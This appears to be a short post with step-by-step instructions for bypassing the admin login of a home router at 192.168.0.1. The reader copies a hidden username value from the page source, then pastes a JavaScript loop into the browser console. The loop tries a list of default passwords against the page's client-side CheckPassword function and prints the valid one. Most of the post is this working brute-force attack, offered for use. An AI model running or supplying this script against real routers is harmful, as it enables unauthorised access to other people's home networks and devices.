Note: This might work in other versions too maybe also this bypass is a client spoofing and It's really hard to explain so let's just get straight to it.

1.Visit http://192.168.0.1/
2.Open Inspect Element and go to Elements.
3.Find this variable UserNameNormal and copy the value of the variable.
3.Go to console but first paste the UserNameNormal value on the username input of the login lastly paste this code there:
var passwords = ["a", "b", "c", "root", "admin", "default123", "default12", "default", "default1234", "rootadmin", "default12345", "adminpldt", "pldtadmin"] //Your passwords dictionary

for( i in passwords ){
    result = CheckPassword(passwords[i])

    if(result == 1){
        console.log(`Valid password ${passwords[i]}`)
    }else{
        console.log(`Invalid password ${passwords[i]}`)
    }
}

4.Press enter, and watch :)
